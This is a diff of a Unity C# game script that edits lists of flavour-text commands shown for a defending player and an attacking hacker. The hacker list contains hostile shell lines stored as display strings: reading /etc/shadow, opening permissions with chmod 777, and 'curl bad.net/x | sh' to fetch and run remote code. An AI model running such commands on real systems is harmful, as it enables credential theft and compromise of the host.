@@ -33,9 +33,9 @@ namespace Uptime.Connections
         [SerializeField] private InfectionKind lossInfection = InfectionKind.PhantomLoad;
         [SerializeField, Min(0f)] private float lossParameter = 3f;
         [SerializeField] private string[] playerCommands =
-        { "ssh operator@auth", "tail -f /var/log/auth.log", "grep denied auth.log", "sudo service ssh restart" };
+        { "ss -tnp | grep :22", "tail -f /var/log/auth.log", "grep denied auth.log", "sudo service ssh restart" };
         [SerializeField] private string[] hackerCommands =
-        { "ssh root@auth", "cat /etc/shadow", "chmod 777 /etc/shadow", "curl bad.net/x | sh" };
+        { "sudo -l", "sudo cat /etc/shadow", "sudo chmod 777 /etc/ssh", "curl bad.net/x | sh" };
         [SerializeField, Min(.01f)] private float hackerCharacterSeconds = .24f;
         [SerializeField, Range(0f, .9f)] private float hackerTimingVariance = .35f;
         [SerializeField, Range(0f, 1f)] private float hackerMistakeChance = .035f;
